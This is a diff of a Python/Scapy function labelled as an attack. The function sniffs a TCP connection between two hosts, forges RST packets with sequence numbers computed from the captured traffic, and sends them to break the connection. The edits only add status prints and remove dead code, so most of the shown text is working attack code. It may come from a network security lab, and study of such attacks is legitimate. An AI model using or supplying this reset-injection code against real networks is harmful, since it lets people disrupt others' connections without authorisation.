@@ -15,23 +15,19 @@ def reset_usage(exit_num=None):
 # run attack
 def tcp_reset(client, src, dst, tcp_rst_count=5):
     fin_found = 0
-
-    l0, l1, l2 = client.gen_layers(src=src, dst=dst, tcp=True)
-    # p = l0 / l1 / l2
+    _, l1, l2 = client.gen_layers(src=src, dst=dst, tcp=True)
     p = l1 / l2
     client.add_options(p, {'TCP': {'flags': 'R'}})
 
-    # print("SRC IP: {} DST IP: {}".format(src.ip, dst.ip))
-    # print("INTFACE: {}".format(client.intface))
-
     while fin_found != 2:
         # capturing a packet with the source and destination provided
+        print('Capturing Packet')
         pack = sniff(
             iface=client.intface,
             count=1,
             lfilter=lambda x: x.haslayer(TCP) and x.haslayer(Raw) and x[IP].src
             == src.ip and x[IP].dst == dst.ip and len(x[TCP].payload) > 0)[0]
-        print(pack)
+        print('Packet Found')
 
         # generating spoofed packets
         if fin_found == 0:
@@ -47,8 +43,10 @@ def tcp_reset(client, src, dst, tcp_rst_count=5):
         seqs = range(pack[TCP].seq, max_seq, len(pack[TCP].payload))[1:]
 
         # sending spoofed packets with calculated seq num
+        print('Sending Reset')
         for seq in seqs:
             p.seq = seq
             send(p, verbose=0)
+        print('Reset Sent')
         # check if fin packet is found
         fin_found = 2
